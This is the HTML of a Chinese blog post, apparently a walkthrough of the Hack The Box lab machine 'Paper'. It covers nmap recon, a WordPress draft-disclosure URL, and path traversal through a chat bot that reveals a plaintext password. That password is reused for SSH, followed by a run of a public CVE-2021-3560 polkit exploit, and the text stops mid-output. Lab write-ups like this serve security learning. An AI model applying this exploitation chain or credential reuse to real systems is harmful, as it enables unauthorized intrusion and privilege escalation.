@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Xu Haoxiang">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Xu Haoxiang">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="">
+    <meta name="description" content="哈哈哈哈给做这个靶机的人好有意思 打的时候笑出了声">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Paper">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/09/17/Paper/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="哈哈哈哈给做这个靶机的人好有意思 打的时候笑出了声">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/3.png">
+<meta property="article:published_time" content="2025-09-17T04:37:12.000Z">
+<meta property="article:modified_time" content="2025-09-18T02:46:08.747Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/09/17/Paper/1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Paper · Eur3ka&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Eur3ka's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Eur3ka&#39;s Studio.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Paper</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Paper
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="HTB">HTB</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/09/17</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>哈哈哈哈给做这个靶机的人好有意思 打的时候笑出了声</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap 10.10.11.143</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-17 12:21 +0800</span><br><span class="line">Nmap scan report for 10.10.11.143 (10.10.11.143)</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br></pre></td></tr></table></figure>
+
+<p>最开始的时候扫描 发现稍微有点奇怪 一个http一个https 但是没有很在意 直接访问发现是一个测试页</p>
+<p><img src="/2025/09/17/Paper/1.png"></p>
+<p>尝试进一步分析 当我用-sCV的时候 发现有点奇怪</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV 10.10.11.143</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-17 12:28 +0800</span><br><span class="line">Nmap scan report for 10.10.11.143 (10.10.11.143)</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE   VERSION</span><br><span class="line">22/tcp   open     ssh       OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)</span><br><span class="line">|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)</span><br><span class="line">|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)</span><br><span class="line">80/tcp   open     http      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">443/tcp  open     ssl/http  Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</span><br><span class="line">|_http-title: HTTP Server Test Page powered by CentOS</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US</span><br><span class="line">| Subject Alternative Name: DNS:localhost.localdomain</span><br><span class="line">| Not valid before: 2021-07-03T08:52:34</span><br><span class="line">|_Not valid after:  2022-07-08T10:32:34</span><br><span class="line">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">5225/tcp filtered hp-server</span><br><span class="line">9290/tcp filtered unknown</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 126.43 seconds</span><br></pre></td></tr></table></figure>
+
+<p><strong>能看到显示的443端口分配给的是测试页</strong> 说明可能存在重定向 抓包后在返回头中看到了后端服务器域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">Date: Wed, 17 Sep 2025 04:34:17 GMT</span><br><span class="line">Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9</span><br><span class="line">X-Backend-Server: office.paper</span><br><span class="line">Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT</span><br><span class="line">ETag: &quot;30c0b-5c5c7fdeec240&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 199691</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>当然使用CMS扫描能发现是个wordpress的博客框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 CmsVulScan.py -u http://office.paper</span><br><span class="line"></span><br><span class="line">  _____            __      __    _  _____</span><br><span class="line"> / ____|           \ \    / /   | |/ ____|</span><br><span class="line">| |     _ __ ___  __\ \  / /   _| | (___   ___ __ _ _ __</span><br><span class="line">| |    | &#x27;_ ` _ \/ __\ \/ / | | | |\___ \ / __/ _` | &#x27;_ \</span><br><span class="line">| |____| | | | | \__ \\  /| |_| | |____) | (_| (_| | | | |</span><br><span class="line"> \_____|_| |_| |_|___/ \/  \__,_|_|_____/ \___\__,_|_| |_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[12:39:38] [*] Check whether the payload file exists</span><br><span class="line">[12:39:38] [*] All Payload 18780 duplicate removal 6935</span><br><span class="line">[12:39:38] [+] Payload load the success</span><br><span class="line">[12:39:38] [*] CMS recognition of http://office.paper in progress</span><br><span class="line">[12:39:38] [*] Scanning by MD5 mode......</span><br><span class="line">[12:39:41] [*] MD5: 85/3725</span><br><span class="line">[12:39:41] [+] Using MD5 to discover the CMS in path /wp-admin/images/wordpress-logo.png: wordpress</span><br><span class="line">[12:40:38] [*] MD5: 1784/3725</span><br><span class="line">[12:40:38] [+] Using MD5 to discover the CMS in path /wp-includes/js/jcrop/Jcrop.gif: WORDPRESS</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-dwight"><a href="#Shell-as-dwight" class="headerlink" title="Shell as dwight"></a>Shell as dwight</h1><h2 id="CVE-2019-17671"><a href="#CVE-2019-17671" class="headerlink" title="CVE-2019-17671"></a>CVE-2019-17671</h2><p>再进一步观察发现 版本是5.2.3的 版本还算可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/http/wordpress_scanner) &gt; run</span><br><span class="line">[*] Trying 10.10.11.143</span><br><span class="line">[+] 10.10.11.143 - Detected Wordpress 5.2.3</span><br></pre></td></tr></table></figure>
+
+<p>通过WPScan和多方搜集找到了CVE-2019-17061 但是为什么实际利用起来会是这样的payload确实想不明白 这块还是不太理解 特别只用了一部分的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://office.paper/?static=1</span><br></pre></td></tr></table></figure>
+
+<p>进来之后拿到用户注册地址 并注册一个账号 成功进入下一步</p>
+<p><img src="/2025/09/17/Paper/2.png"></p>
+<h1 id="Shell-as-dwight-1"><a href="#Shell-as-dwight-1" class="headerlink" title="Shell as dwight"></a>Shell as dwight</h1><p>发现这个机器人可以执行cd和cat操作 试一下拿flag</p>
+<p><img src="/2025/09/17/Paper/3.png"></p>
+<p>发现他在装傻 故意不给我() 看了下目录发现这个机器人应该就是在dwight用户下跑的 后边没思路了去看了下HTB给的提示 找到机器人对应的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!=====Contents of file ../../../home/dwight/hubot/.env=====&gt;</span><br><span class="line">export ROCKETCHAT_URL=&#x27;http://127.0.0.1:48320&#x27;</span><br><span class="line">export ROCKETCHAT_USER=recyclops</span><br><span class="line">export ROCKETCHAT_PASSWORD=Queenofblad3s!23</span><br><span class="line">export ROCKETCHAT_USESSL=false</span><br><span class="line">export RESPOND_TO_DM=true</span><br><span class="line">export RESPOND_TO_EDITED=true</span><br><span class="line">export PORT=8000</span><br><span class="line">export BIND_ADDRESS=127.0.0.1</span><br><span class="line">&lt;!=====End of file ../../../home/dwight/hubot/.env=====&gt;</span><br></pre></td></tr></table></figure>
+
+<p>确实 都是同一个用户的话 密码复用的概率极高 即使真实情况也如此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh dwight@10.10.11.143</span><br><span class="line">The authenticity of host &#x27;10.10.11.143 (10.10.11.143)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.143&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">dwight@10.10.11.143&#x27;s password:</span><br><span class="line">Activate the web console with: systemctl enable --now cockpit.socket</span><br><span class="line"></span><br><span class="line">Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23</span><br><span class="line">[dwight@paper ~]$</span><br></pre></td></tr></table></figure>
+
+<p>至此成功连上SSH 拿到flag</p>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">❯ ssh dwight@10.10.11.143</span><br><span class="line">dwight@10.10.11.143&#x27;s password:</span><br><span class="line">Activate the web console with: systemctl enable --now cockpit.socket</span><br><span class="line"></span><br><span class="line">Last login: Wed Sep 17 06:39:13 2025 from 10.10.16.2</span><br><span class="line">[dwight@paper ~]$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br><span class="line"></span><br><span class="line">[sudo] password for dwight:</span><br><span class="line">Sorry, user dwight may not run sudo on paper.</span><br></pre></td></tr></table></figure>
+
+<p>直接sudo -l发现并没有找到什么有意思的 换种方式试一下 最开始还是先试一下SUID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dwight@paper ~]$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>发现了有polkit 这个东西好像有洞 那就传个linpeas上去看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                                        ╔════════════════════╗</span><br><span class="line">════════════════════════════════════════╣ System Information ╠════════════════════════════════════════</span><br><span class="line">                                        ╚════════════════════╝</span><br><span class="line">╔══════════╣ Operative system</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits</span><br><span class="line">Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021</span><br><span class="line">lsb_release Not Found</span><br><span class="line"></span><br><span class="line">╔══════════╣ Sudo version</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version   </span><br><span class="line">Sudo version 1.8.29</span><br><span class="line"></span><br><span class="line">╔══════════╣ CVEs Check</span><br><span class="line">Vulnerable to CVE-2021-3560 </span><br></pre></td></tr></table></figure>
+
+<p>CVE-2021-3560对应的正好就是polkit的洞 找到脚本跑一手 脚本有概率成功 多试几次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</span><br><span class="line"></span><br><span class="line">[dwight@paper ~]$ bash ./poc.sh</span><br><span class="line"></span><br><span class="line">[!] Username set as : secnigma</span><br><span class="line">[!] No Custom Timing specified.</span><br><span class="line">[!] Timing will be detected Automatically</span><br><span class="line">[!] Force flag not set.</span><br><span class="line">[!] Vulnerability checking is ENABLED!</span><br><span class="line">[!] Starting Vulnerability Checks...</span><br><span class="line">[!] Checking distribution...</span><br><span class="line">[!] Detected Linux distribution as &quot;centos&quot;</span><br><span class="line">[!] Checking if Accountsservice and Gnome-Control-Center is installed</span><br><span class="line">[+] Accounts service and Gnome-Control-Center Installation Found!!</span><br><span class="line">[!] Checking if polkit version is vulnerable</span><br><span class="line">[+] Polkit version appears to be vulnerable!!</span><br><span class="line">[!] Starting exploit...</span><br><span class="line">[!] Inserting Username secnigma...</span><br><span class="line">Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required</span><br><span class="line">[+] Inserted Username secnigma  with UID 1005!</span><br><span class="line">[!] Inserting password 